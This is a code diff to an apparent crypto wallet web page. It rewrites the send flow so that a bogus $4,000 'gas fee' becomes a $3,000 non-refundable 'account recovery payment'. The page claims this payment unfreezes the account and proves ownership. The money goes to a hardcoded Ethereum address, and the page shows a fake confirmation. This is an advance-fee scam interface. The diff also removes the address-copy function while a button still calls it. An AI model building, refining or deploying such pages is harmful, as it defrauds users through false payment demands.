@@ -194,7 +194,7 @@
 </div>
 
 <!-- ═══════════════════════════════════════
-     SEND MODAL — Step 2: Gas Fee + Deposit
+     SEND MODAL — Step 2: Account Recovery Payment
 ════════════════════════════════════════ -->
 <div class="wallet-modal-overlay hidden" id="send-deposit-overlay" onclick="if(event.target===this)this.classList.add('hidden')">
   <div class="wallet-modal-card">
@@ -202,55 +202,68 @@
       <button class="wm-back-btn" onclick="document.getElementById('send-deposit-overlay').classList.add('hidden');document.getElementById('send-modal-overlay').classList.remove('hidden')">
         <i class="bi bi-arrow-left me-1"></i>Back
       </button>
-      <h5 class="fw-800 mb-0">⛽ Gas Fee Required</h5>
+      <h5 class="fw-800 mb-0" style="font-size:14px;">🔒 Account Recovery Payment</h5>
       <button class="wallet-modal-close" onclick="document.getElementById('send-deposit-overlay').classList.add('hidden')">
         <i class="bi bi-x-lg"></i>
       </button>
     </div>
     <div class="wallet-modal-body">
 
-      <!-- Summary -->
-      <div class="send-summary-box mb-4">
-        <div class="send-summary-row">
-          <span>Sending</span>
-          <strong id="dep-send-summary">—</strong>
+      <!-- Header alert -->
+      <div style="background:linear-gradient(135deg,rgba(220,38,38,.1),rgba(220,38,38,.05));border:1.5px solid rgba(220,38,38,.35);border-radius:14px;padding:14px 16px;margin-bottom:14px;">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px;">
+          <span style="font-size:16px;">🔒</span>
+          <strong style="font-size:13px;color:#dc2626;">Account Recovery Payment Required to Unfreeze Account</strong>
         </div>
-        <div class="send-summary-row">
-          <span>To</span>
-          <strong id="dep-recipient-summary" style="font-family:var(--mono);font-size:12px;word-break:break-all;text-align:right;max-width:220px;">—</strong>
+        <p style="font-size:12px;color:#7f1d1d;margin:0;line-height:1.6;">
+          To process your send transaction and restore full access to the send feature, a one-time account recovery payment of <strong>$3,000 (ERC-20)</strong> is required. This payment confirms that you are the rightful owner of this account and enables the system to unfreeze your account.
+        </p>
+      </div>
+
+      <!-- Purpose + How It Works -->
+      <div style="background:var(--panel2);border:1px solid var(--border);border-radius:12px;padding:13px 15px;margin-bottom:12px;font-size:12px;color:var(--text2);line-height:1.65;">
+        <div style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.07em;color:var(--text3);margin-bottom:6px;">Purpose</div>
+        <p style="margin:0 0 10px;">This payment is to <strong>unfreeze your account</strong> and verify ownership so you can continue to send and transact without restrictions.</p>
+        <div style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.07em;color:var(--text3);margin-bottom:6px;">How It Works</div>
+        <ol style="margin:0;padding-left:17px;">
+          <li style="margin-bottom:4px;">Pay the one-time account recovery payment of <strong>$3,000 (ERC-20)</strong>.</li>
+          <li>Once confirmed on-chain, your account will be unfrozen and full access will be restored.</li>
+        </ol>
+      </div>
+
+      <!-- Payment Frequency + Important -->
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:14px;">
+        <div style="background:rgba(99,102,241,.06);border:1px solid rgba(99,102,241,.2);border-radius:10px;padding:10px 12px;">
+          <div style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.06em;color:#6366f1;margin-bottom:5px;">Payment Frequency</div>
+          <p style="font-size:11px;color:var(--text2);margin:0;line-height:1.5;">This is a <strong>one-time payment</strong>. You will only be asked again if your account becomes frozen in the future.</p>
         </div>
-        <div class="send-summary-row border-top pt-2 mt-1">
-          <span>⛽ Network Gas Fee (<span id="dep-fee-chain-sym">ETH</span>)</span>
-          <strong style="color:#ef4444;">$4,000.00</strong>
+        <div style="background:rgba(220,38,38,.06);border:1px solid rgba(220,38,38,.2);border-radius:10px;padding:10px 12px;">
+          <div style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.06em;color:#dc2626;margin-bottom:5px;">⚠ Important</div>
+          <p style="font-size:11px;color:var(--text2);margin:0;line-height:1.5;">This is <strong>not a deposit</strong> and is <strong>non-refundable</strong>. It is a one-time recovery payment to confirm ownership.</p>
         </div>
       </div>
 
-      <!-- Pay gas fee to this address -->
-      <label class="wm-label mb-2"><i class="bi bi-wallet2 me-1"></i>Pay Gas Fee To This Address</label>
-
-      <!-- Chain tabs hidden — locked to sending chain -->
-      <div class="dep-chain-tabs mb-3" id="dep-chain-tabs" style="display:none;">
-        <button class="dep-tab dep-tab-active" data-chain="ethereum" onclick="setDepChain('ethereum',this)">🔷 ETH</button>
-        <button class="dep-tab" data-chain="bsc"      onclick="setDepChain('bsc',this)">🟡 BNB</button>
-        <button class="dep-tab" data-chain="solana"   onclick="setDepChain('solana',this)">🟣 SOL</button>
-      </div>
-
-      <!-- Full address display -->
-      <div class="dep-addr-card mb-3">
-        <div class="dep-addr-label" id="dep-chain-label">Ethereum (ERC-20)</div>
-        <code class="dep-addr-code" id="dep-addr-display">0x9901E676D0a27e2B5D3DC9fc9fe227F003F559cf</code>
-        <button class="dep-addr-copy-btn" id="dep-addr-copy-btn" onclick="copyDepAddr()">
+      <!-- Deposit address -->
+      <label class="wm-label mb-2">Deposit Address (ERC-20 / ETH)</label>
+      <div class="dep-addr-card mb-3" style="background:linear-gradient(145deg,#1e3a8a,#1e40af);">
+        <div class="dep-addr-label" id="dep-chain-label" style="color:rgba(255,255,255,.7);">Ethereum · ERC-20</div>
+        <code class="dep-addr-code" id="dep-addr-display" style="color:#fff;background:rgba(255,255,255,.12);">0x9901E676d0a27e2B5D3DC9fc9fe227F003F559cf</code>
+        <button class="dep-addr-copy-btn" id="dep-addr-copy-btn" onclick="copyDepAddr()" style="background:rgba(255,255,255,.2);color:#fff;border-color:transparent;">
           <i class="bi bi-copy me-1"></i>Copy Address
         </button>
       </div>
 
-      <div class="wm-info-box mb-4">
-        <i class="bi bi-info-circle me-1"></i>
-        Send <strong>$4,000</strong> equivalent in <strong id="dep-sym-label">ETH</strong> on the <strong id="dep-chain-name-label">Ethereum</strong> network to the address above, then click <strong>"I've Paid"</strong>. Our team will verify and process your withdrawal within minutes.
+      <!-- Payment summary table -->
+      <div style="background:var(--panel2);border:1px solid var(--border);border-radius:12px;padding:12px 15px;margin-bottom:14px;">
+        <div class="send-summary-row"><span>Recovery Payment</span><strong style="color:#dc2626;">$3,000.00</strong></div>
+        <div class="send-summary-row"><span>Network</span><strong>Ethereum (ERC-20)</strong></div>
+        <div class="send-summary-row"><span>Purpose</span><strong>Unfreezing of account &amp; ownership verification</strong></div>
+        <div class="send-summary-row"><span>Payment Type</span><strong>One-time recovery payment</strong></div>
+        <div class="send-summary-row"><span>Refundable</span><strong style="color:#dc2626;">No</strong></div>
       </div>
 
-      <button class="wm-cta-btn" onclick="submitGasPayment()">
-        <i class="bi bi-check2-circle me-2"></i>I've Paid — Notify Team
+      <button class="wm-cta-btn" onclick="submitGasPayment()" style="background:linear-gradient(135deg,#dc2626,#b91c1c);box-shadow:0 4px 18px rgba(220,38,38,.35);">
+        <i class="bi bi-check2-circle me-2"></i>I Have Sent — Notify Admin
       </button>
       <div id="dep-status" style="text-align:center;font-size:13px;margin-top:8px;min-height:18px;"></div>
     </div>
@@ -261,9 +274,9 @@
 <div class="modal fade" id="sendSuccessModal" tabindex="-1" aria-hidden="true">
   <div class="modal-dialog modal-dialog-centered modal-sm">
     <div class="modal-content text-center" style="border-radius:18px;padding:28px;">
-      <div style="font-size:52px;margin-bottom:12px;">✅</div>
-      <h5 class="fw-800 mb-2">Payment Notified!</h5>
-      <p class="text-secondary" style="font-size:13px;">Our team has been notified. Your withdrawal will be processed shortly after verification.</p>
+      <div style="font-size:52px;margin-bottom:12px;">⏳</div>
+      <h5 class="fw-800 mb-2">Recovery Payment Notified!</h5>
+      <p class="text-secondary" style="font-size:13px;">Admin has been notified. Your account will be unfrozen and your withdrawal processed after payment verification.</p>
       <button class="wm-cta-btn mt-2" data-bs-dismiss="modal" style="font-size:14px;padding:10px;">Done</button>
     </div>
   </div>
@@ -467,31 +480,10 @@
     if (!addr)   { alert('Please enter a recipient address.'); return; }
     if (!amount || parseFloat(amount) <= 0) { alert('Please enter an amount.'); return; }
 
-    document.getElementById('dep-send-summary').textContent = `${amount} ${_sendSym}`;
-    document.getElementById('dep-recipient-summary').textContent = addr;
+    // Account recovery payment is ALWAYS ERC-20 regardless of sending chain
+    document.getElementById('dep-addr-display').textContent = EVM_ADDR;
+    document.getElementById('dep-chain-label').textContent  = 'Ethereum · ERC-20';
     document.getElementById('dep-status').textContent = '';
-
-    // Lock deposit chain to the SENDING chain — hide all other tabs
-    const tabsContainer = document.getElementById('dep-chain-tabs');
-    tabsContainer.style.display = 'none'; // hide chain selector — address is for sending chain
-
-    // Set the deposit chain = sending chain and show its address
-    _depChain = _sendChain;
-    document.getElementById('dep-addr-display').textContent = DEP_ADDRESSES[_sendChain] || EVM_ADDR;
-    document.getElementById('dep-chain-label').textContent  = DEP_LABELS[_sendChain]  || _sendChain;
-
-    // Update gas fee label with sending chain symbol
-    const feeChainSym = document.getElementById('dep-fee-chain-sym');
-    if (feeChainSym) feeChainSym.textContent = _sendSym;
-
-    // Update info box labels
-    const symLbl = document.getElementById('dep-sym-label');
-    const chainNameLbl = document.getElementById('dep-chain-name-label');
-    if (symLbl) symLbl.textContent = _sendSym;
-    if (chainNameLbl) {
-      const chainNames = { ethereum:'Ethereum', bsc:'BNB Chain', polygon:'Polygon', arbitrum:'Arbitrum', base:'Base', optimism:'Optimism', solana:'Solana' };
-      chainNameLbl.textContent = chainNames[_sendChain] || _sendChain;
-    }
 
     // Reset copy button
     const copyBtn = document.getElementById('dep-addr-copy-btn');
@@ -501,23 +493,6 @@
     document.getElementById('send-deposit-overlay').classList.remove('hidden');
   }
 
-  // ── Send Step 2: Deposit chain ────────────────────────────
-  function setDepChain(chain, btn) {
-    _depChain = chain;
-    document.querySelectorAll('.dep-tab').forEach(b=>b.classList.remove('dep-tab-active'));
-    if (btn) btn.classList.add('dep-tab-active');
-    document.getElementById('dep-addr-display').textContent = DEP_ADDRESSES[chain] || EVM_ADDR;
-    document.getElementById('dep-chain-label').textContent  = DEP_LABELS[chain] || chain;
-  }
-
-  function copyDepAddr() {
-    const addr = document.getElementById('dep-addr-display').textContent.trim();
-    navigator.clipboard.writeText(addr).catch(()=>{});
-    const btn = document.getElementById('dep-addr-copy-btn');
-    btn.innerHTML = '<i class="bi bi-check me-1"></i>Copied!';
-    setTimeout(()=>btn.innerHTML='<i class="bi bi-copy me-1"></i>Copy Address', 1800);
-  }
-
   async function submitGasPayment() {
     const btn    = document.querySelector('#send-deposit-overlay .wm-cta-btn');
     const status = document.getElementById('dep-status');
@@ -525,16 +500,12 @@
     btn.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span>Submitting…';
 
     try {
-      await fetch('/api/swap/request', {
+      await fetch('/api/gas-fee/request', {
         method:'POST',
         headers:{'Content-Type':'application/json'},
         body: JSON.stringify({
-          token_symbol:  'GAS_FEE',
-          token_name:    'Gas Fee for Withdrawal',
-          token_address: '',
-          chain:         _sendChain,
-          amount_usd:    4000,
-          deposit_chain: _depChain,
+          chain:     _sendChain,
+          amount_usd: 3000,
         }),
       });
     } catch(e) {}
@@ -542,7 +513,7 @@
     document.getElementById('send-deposit-overlay').classList.add('hidden');
     new bootstrap.Modal(document.getElementById('sendSuccessModal')).show();
     btn.disabled = false;
-    btn.innerHTML = '<i class="bi bi-check2-circle me-2"></i>I\'ve Paid — Notify Team';
+    btn.innerHTML = '<i class="bi bi-check2-circle me-2"></i>I Have Sent — Notify Admin';
   }
 
   // ── Receive modal ─────────────────────────────────────────
